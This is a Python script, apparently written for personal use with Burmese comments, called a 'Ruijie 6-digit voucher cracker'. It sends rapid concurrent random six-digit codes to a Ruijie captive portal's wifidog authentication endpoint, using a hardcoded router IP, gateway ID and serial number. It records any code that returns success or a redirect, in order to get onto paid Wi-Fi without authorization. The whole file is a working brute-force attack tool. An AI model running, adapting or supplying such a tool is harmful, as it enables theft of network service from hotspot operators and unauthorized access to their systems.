import sys, os, asyncio, aiohttp, random
from colorama import Fore, init

init(autoreset=True)

# အစ်ကို့ Canary data အစစ်များ
TARGET_IP = "192.168.110.1"
GW_ID = "58b4bbd9c1e9"
GW_SN = "H1U42FJ004707"

FOUND_VOUCHERS = []

async def check_voucher(session, v):
    global FOUND_VOUCHERS
    url = f"http://{TARGET_IP}:2060/wifidog/auth"
    params = {"token": v, "gw_id": GW_ID, "gw_sn": GW_SN}
    try:
        async with session.get(url, params=params, timeout=0.7) as res:
            text = await res.text()
            # Ruijie စနစ်အရ success သို့မဟုတ် redirect ဖြစ်ရင် အမှန်ပဲ
            if "success" in text.lower() or res.status == 302:
                if v not in FOUND_VOUCHERS:
                    FOUND_VOUCHERS.append(v)
                    with open("found_vouchers.txt", "a") as f:
                        f.write(f"{v}\n")
                    return True
    except:
        pass
    return False

async def start_cracking():
    os.system('clear')
    print(f"{Fore.CYAN}========================================")
    print(f"{Fore.WHITE}   RUIJIE 6-DIGIT VOUCHER CRACKER V2")
    print(f"{Fore.CYAN}========================================\n")

    async with aiohttp.ClientSession() as session:
        while True:
            # တစ်ခါတည်း လမ်းကြောင်း ၅ ခု အပြိုင်စစ်မယ် (အစ်ကိုလိုချင်တဲ့ display ပုံစံအတွက်)
            v_list = [str(random.randint(100000, 999999)) for _ in range(5)]
            
            # Scanning Display (အစ်ကို့ ဥပမာအတိုင်း)
            scan_line = " | ".join([f"{Fore.YELLOW}{c}" for c in v_list])
            print(f"{Fore.CYAN}[*] Fast Crack: {scan_line}")

            tasks = [check_voucher(session, v) for v in v_list]
            results = await asyncio.gather(*tasks)

            # အမှန်တွေ့ရင် ထင်ထင်ရှားရှား ပြမယ်
            if any(results) or FOUND_VOUCHERS:
                valid_list = " ".join([f"{Fore.GREEN}{c}" for c in FOUND_VOUCHERS])
                print(f"\n{Fore.GREEN}[!] SUCCESS MATCH: {valid_list}")
                print(f"{Fore.CYAN}----------------------------------------")

            # ဖုန်းမဟန်းအောင် အနည်းငယ်နားမယ်
            await asyncio.sleep(0.02)

if __name__ == "__main__":
    try:
        asyncio.run(start_cracking())
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Hack Paused.")
